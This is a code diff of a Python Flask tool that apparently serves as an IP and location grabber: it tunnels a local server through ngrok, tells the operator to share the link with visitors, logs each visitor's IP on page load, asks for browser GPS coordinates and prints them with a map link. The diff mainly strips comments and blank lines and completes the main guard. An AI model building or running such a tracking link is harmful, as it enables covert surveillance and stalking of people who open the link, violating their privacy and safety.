@@ -25,10 +25,7 @@ HTML_IMMEDIATE = """
   <h2>Thanks for visiting!</h2>
   <p>Your IP has been logged.</p>
   <script>
-    // Immediately send visitor IP info to server
     fetch("/log_ip", {method: "POST"}).catch(() => {});
-
-    // Try to get GPS location as well, if user allows
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         function(position) {
@@ -76,7 +73,6 @@ def get_location(ip):
         return {"IP": ip, "Error": str(e)}
     return {"IP": ip, "Error": "Unknown error"}
 
-
 @app.route('/')
 def index():
     return render_template_string(HTML_BASIC)
@@ -97,7 +93,6 @@ def submit_location():
     lat = data.get("latitude")
     lon = data.get("longitude")
     accuracy = data.get("accuracy")
-
     result = {
         "method": "GPS",
         "Latitude": lat,
@@ -106,22 +101,17 @@ def submit_location():
         "Map": f"https://www.google.com/maps?q={lat},{lon}",
         "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
-
     print("\n--- Accurate Location Captured (GPS) ---")
     for k, v in result.items():
         print(f"{k}: {v}")
     print("----------------------------------------\n")
-
     return "Location received!"
-
 
 @app.route('/immediate')
 def immediate():
     return render_template_string(HTML_IMMEDIATE)
 
-
 def download_ngrok():
-    
     if not os.path.isfile("ngrok"):
         print("\033[93m[•] Downloading ngrok...\033[0m")
         os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
@@ -130,28 +120,21 @@ def download_ngrok():
 
 def start_ngrok(subdomain=""):
     token = input("Enter your Ngrok Authtoken: ").strip()
-
     if not os.path.isfile("ngrok"):
         download_ngrok()
-
     os.system(f"./ngrok authtoken {token}")
-
     cmd = ["./ngrok", "http", "5000"]
     if subdomain:
         cmd.append(f"--subdomain={subdomain}")
-
     print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
     ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
-
-    time.sleep(5)  
-
+    time.sleep(5)
     try:
         tunnels = requests.get("http://localhost:4040/api/tunnels").json()
         public_url = tunnels['tunnels'][0]['public_url']
         print(f"\033[92m[✓] Ngrok tunnel started: {public_url}\033[0m")
     except Exception as e:
         print(f"\033[91m[✗] Failed to get ngrok URL: {e}\033[0m")
-
     return ngrok_process
 
 def run_flask():
@@ -168,14 +151,10 @@ def ip_lookup():
 def generate_link():
     subdomain = input("Enter desired ngrok subdomain (or leave blank for random): ").strip()
     ngrok_process = start_ngrok(subdomain)
-
-    # Run Flask in thread
     flask_thread = Thread(target=run_flask)
     flask_thread.start()
-
     print("\033[93m[•] Flask app running on http://0.0.0.0:5000/\033[0m")
     print("\033[93m[•] Share the above ngrok URL with visitors to capture IPs.\033[0m")
-
     try:
         while flask_thread.is_alive():
             time.sleep(1)
@@ -187,21 +166,15 @@ def generate_link():
 def immediate_ip_gps_option():
     subdomain = input("Enter desired ngrok subdomain (or leave blank for random): ").strip()
     token = input("Enter your Ngrok Authtoken: ").strip()
-
     if not os.path.isfile("ngrok"):
         download_ngrok()
-
     os.system(f"./ngrok authtoken {token}")
-
     cmd = ["./ngrok", "http", "5000"]
     if subdomain:
         cmd.append(f"--subdomain={subdomain}")
-
     print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
     ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
-
-    time.sleep(5)  
-
+    time.sleep(5)
     try:
         tunnels = requests.get("http://localhost:4040/api/tunnels").json()
         public_url = tunnels['tunnels'][0]['public_url']
@@ -212,11 +185,8 @@ def immediate_ip_gps_option():
         print(f"\033[91m[✗] Failed to get ngrok URL: {e}\033[0m")
         ngrok_process.terminate()
         return
-
-    
     flask_thread = Thread(target=run_flask)
     flask_thread.start()
-
     try:
         while flask_thread.is_alive():
             time.sleep(1)
@@ -245,4 +215,5 @@ def menu():
         else:
             print("Invalid option.")
 
-if __name__ == '__main
+if __name__ == '__main__':
+    menu()
